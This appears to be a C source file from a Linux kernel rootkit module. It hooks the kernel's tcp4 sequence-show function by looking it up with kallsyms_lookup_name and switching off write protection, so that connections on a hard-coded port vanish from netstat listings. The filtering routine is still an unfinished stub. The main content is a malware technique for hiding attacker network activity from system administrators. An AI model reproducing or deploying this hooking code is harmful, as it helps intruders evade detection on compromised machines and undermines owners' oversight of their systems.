#include <linux/kernel.h>
#include <linux/seq_file.h>

#include "common.h"
#include "hook.h"

#define SIZE_PORT_COLON 6

const char *netstat_sep = "\n";

typedef unsigned short port_t;

//TODO add list with [PROTO:PORT] structs
static port_t to_hide = 41821;

static int (*tcp4_seq_show)(struct seq_file *seq, void *v);
static int (*udp4_seq_show)(struct seq_file *seq, void *v);
static int (*tcp6_seq_show)(struct seq_file *seq, void *v);
static int (*udp6_seq_show)(struct seq_file *seq, void *v);

static int g7_tcp4_seq_show(struct seq_file *seq, void *v);

void
hook_show(void)
{
    tcp4_seq_show 
        = ((struct seq_operations *)kallsyms_lookup_name("tcp4_seq_ops"))->show;

    disable_protection();
    ((struct seq_operations *)kallsyms_lookup_name("tcp4_seq_ops"))->show
        = (void *)g7_tcp4_seq_show;
    enable_protection();
    
    DEBUG_INFO("tcp4 show has been hooked!\n");
}

void
unhook_show(void)
{
    disable_protection();
    ((struct seq_operations *)kallsyms_lookup_name("tcp4_seq_ops"))->show
        = (void *)tcp4_seq_show;
    enable_protection();
}

//Hide by removing the appropriate line and decreasing the sequence number accordingly
//Sequence number is always 4 digits for tcp (e.g.: https://elixir.bootlin.com/linux/v4.19/source/net/ipv6/tcp_ipv6.c#L1884)
static void
hide_netstat_tcp(char *port, struct seq_file *seq)
{
    char *tok;
    char *cur = seq->buf;

    char ret_buf[seq->size];

    while((tok = strsep(&cur, netstat_sep))) {
        //doStuff
    }
}

//seq includes all the info we need
//https://elixir.bootlin.com/linux/v4.19/source/include/linux/seq_file.h#L16
static int
g7_tcp4_seq_show(struct seq_file *seq, void *v)
{
    int ret = tcp4_seq_show(seq, v);

    //Ports are displayed as uppercase hex
    //Since we don't want to detect random hex strings, we add the colon
    char hex_port[SIZE_PORT_COLON];
    sprintf(hex_port, ":%04X", to_hide);

    if(strstr(seq->buf, hex_port))
       hide_netstat_tcp(hex_port, seq);
    
    return ret;
}
